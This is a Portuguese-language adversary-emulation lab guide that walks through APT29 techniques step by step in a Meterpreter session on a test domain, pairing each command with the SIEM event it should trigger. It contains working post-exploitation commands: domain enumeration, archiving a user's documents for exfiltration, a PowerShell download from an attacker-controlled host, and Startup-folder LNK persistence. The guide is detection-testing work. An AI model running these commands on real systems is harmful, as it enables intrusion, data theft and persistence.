# APT29 — TTPs Execution Guide

> Guia de execução passo a passo dos TTPs APT29 na sessão Meterpreter activa.
> Segue esta sequência após o payload ter estabelecido o C2 com sucesso.
> Cada passo documenta o comando a executar, o que acontece no sistema e o evento gerado no SIEM.

---

## Pré-condição

Antes de começar confirma que tens a sessão Meterpreter activa:

```
meterpreter > getuid
Server username: LAB\Administrator

meterpreter > sysinfo
Computer: WIN-DC01
OS: Windows 2022 (10.0 Build 20348)
Domain: LAB
```

Se a sessão não estiver activa volta ao [README](README.md) e executa o `auto-lnk.sh` primeiro.

---

## Fase 3 — Discovery

### Passo 1 — T1087 — Account Discovery

Abre uma shell no sistema comprometido e enumera os utilizadores do domínio.

```
meterpreter > shell
Process 1234 created.
Channel 1 created.

C:\Windows\system32> net user
C:\Windows\system32> net user /domain
```

Resultado esperado:
```
User accounts for \\WIN-DC01

Administrator    madAdmin    m.torres
r.anderson       s.connor    svc.backup
```

Evento gerado no SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\net.exe
CommandLine: net user /domain
```

---

### Passo 2 — T1069 — Permission Groups Discovery

Enumera os grupos privilegiados do domínio para identificar alvos de escalada.

```
C:\Windows\system32> net group "Domain Admins" /domain
C:\Windows\system32> net group "Enterprise Admins" /domain
```

Resultado esperado:
```
Group name     Domain Admins
Members        Administrator  madAdmin
```

Evento gerado no SIEM:
```
EventID: 4688
CommandLine: net group "Domain Admins" /domain
```

---

### Passo 3 — T1082 — System Information Discovery

Recolhe informação detalhada do sistema para mapear o ambiente.

```
C:\Windows\system32> systeminfo
```

Resultado esperado:
```
OS Name:       Microsoft Windows Server 2022
Domain:        lab.local
Logon Server:  \\WIN-DC01
```

Evento gerado no SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\systeminfo.exe
```

---

### Passo 4 — T1057 — Process Discovery

Enumera os processos em execução para identificar ferramentas de segurança e outros alvos.

```
C:\Windows\system32> tasklist
C:\Windows\system32> tasklist /v
```

Evento gerado no SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\tasklist.exe
```

---

### Passo 5 — T1012 — Registry Query

Consulta o registo do Windows para recolher configurações do sistema e identificar software instalado.

```
C:\Windows\system32> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
C:\Windows\system32> reg query HKLM\SYSTEM\CurrentControlSet\Services
```

Evento gerado no SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\reg.exe
CommandLine: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
```

---

## Fase 4 — Collection e Persistence

### Passo 6 — T1560 — Archive Collected Data

Comprime os documentos do Administrator para preparar a exfiltração. Nota que o 7-Zip não está no PATH do sistema e requer o caminho completo.

```
C:\Windows\system32> "C:\Program Files\7-Zip\7z.exe" a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*
```

Resultado esperado:
```
7-Zip 22.01
Creating archive: C:\Users\Public\data.zip
Add new data to archive: 1 file, 0 bytes
```

Evento gerado no SIEM:
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Program Files\7-Zip\7z.exe
CommandLine: 7z a -tzip C:\Users\Public\data.zip ...

EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Public\data.zip
```

---

### Passo 7 — T1105 — Ingress Tool Transfer

Descarrega um ficheiro adicional do servidor HTTP do Kali para simular a transferência de ferramentas para o sistema comprometido. Executa dentro do PowerShell.

```
C:\Windows\system32> powershell.exe

PS C:\Windows\system32> Invoke-WebRequest -Uri "http://192.168.10.102:8080/ds7002.zip" -OutFile "C:\Users\Public\stage2.zip"
```

Confirma que o servidor HTTP está a correr no Kali antes deste passo:
```bash
# No Kali — Terminal separado
cd ~/adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/lab_4.3/
python3 -m http.server 8080
```

Evento gerado no SIEM:
```
EventID: 4104 (PowerShell Script Block Logging)
ScriptBlockText: Invoke-WebRequest -Uri http://192.168.10.102:8080/ds7002.zip

EventID: 3 (Sysmon NetworkConnect)
DestinationPort: 8080
Image: powershell.exe
```

---

### Passo 8 — T1547.009 — Startup Folder Persistence

Instala persistência copiando o payload LNK para a pasta Startup do utilizador. O payload vai executar automaticamente no próximo login.

O ficheiro LNK está dentro do ZIP descarregado na fase de Initial Access. Extrai primeiro e depois copia para a pasta Startup.

```
PS C:\Windows\system32> Expand-Archive -Path "C:\Users\Administrator\Downloads\ds7002.zip" -DestinationPath "C:\Users\Administrator\Downloads\ds7002\" -Force

PS C:\Windows\system32> Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

Confirma que o ficheiro foi copiado:
```
PS C:\Windows\system32> dir "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

Resultado esperado:
```
Mode    LastWriteTime   Name
----    -------------   ----
-a----  13/05/2026      ds7002.lnk
```

Evento gerado no SIEM:
```
EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\
                Start Menu\Programs\Startup\ds7002.lnk
```

---

## Verificar Detecção no SIEM

Após executar todos os TTPs verifica os alertas no Kibana:

```
http://192.168.10.20:5601
Security -> Alerts
```

Deves ver alertas para todos os TTPs executados. Para fazer o deploy das regras de detecção antes de executar o ataque consulta:

```
../04-detection/README.md
```

Para ver a timeline completa do ataque com evidências reais:

```
../02-attack-phases/attack-timeline-pt.md
```

---

## Referências

- [MAD20 APT29 Emulation Plan — Lab 4.3](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
